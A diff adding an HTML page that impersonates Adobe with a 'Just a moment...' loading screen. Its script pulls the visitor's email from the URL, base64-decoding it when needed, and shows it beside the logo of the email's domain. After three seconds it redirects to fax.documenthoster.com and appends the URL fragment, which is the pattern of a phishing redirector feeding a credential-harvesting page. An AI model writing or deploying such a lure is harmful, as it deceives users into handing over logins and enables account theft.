@@ -1,0 +1,105 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe - Just a moment...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f00;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+        }
+        .logo {
+            width: 90px;
+            margin-bottom: 15px;
+            background: white;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #FFFFFF;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <link rel="preload" href="https://logo.clearbit.com/adobe.com" as="image">
+</head>
+<body>
+    <img id="logo" class="logo" alt="Provider Logo">
+    <p class="email-display" id="userEmail">Verifying...</p>
+    <div class="spinner"></div>
+    <p>Just a moment...</p>
+
+    <script>
+        function getQueryParam(name) {
+            const params = new URLSearchParams(window.location.search);
+            return params.get(name);
+        }
+
+        function getDomainLogo(domain) {
+            return `https://logo.clearbit.com/${domain}`;
+        }
+
+        function decodeBase64(encoded) {
+            try {
+                return atob(encoded);
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function customEncodeEmail(email) {
+            // Manually encode the email, except for the "@" symbol.
+            return email.split('@').map(encodeURIComponent).join('@');
+        }
+
+        function getFragment() {
+            return window.location.hash.substring(1);  // Remove the '#' symbol
+        }
+
+        const emailParam = getQueryParam("email");
+        let email = emailParam;
+        
+        if (email) {
+            if (email.includes('%3D')) {  // Check if the email is likely base64 encoded
+                email = decodeBase64(email);  // Decode base64 if needed
+            }
+            
+            document.getElementById("userEmail").innerText = email;
+            const domain = email.split("@")[1].toLowerCase();
+            document.getElementById("logo").src = getDomainLogo(domain);
+        } else {
+            document.getElementById("logo").src = "https://logo.clearbit.com/adobe.com";
+        }
+
+        // Capture the fragment part and append it to the redirect URL
+        const fragment = getFragment();
+        
+        setTimeout(() => { 
+            let redirectUrl = `https://fax.documenthoster.com/K46S8/`;
+            if (fragment) {
+                redirectUrl += `?e=${fragment}`;
+            }
+            window.location.href = redirectUrl;
+        }, 3000);
+    </script>
+</body>
+</html>
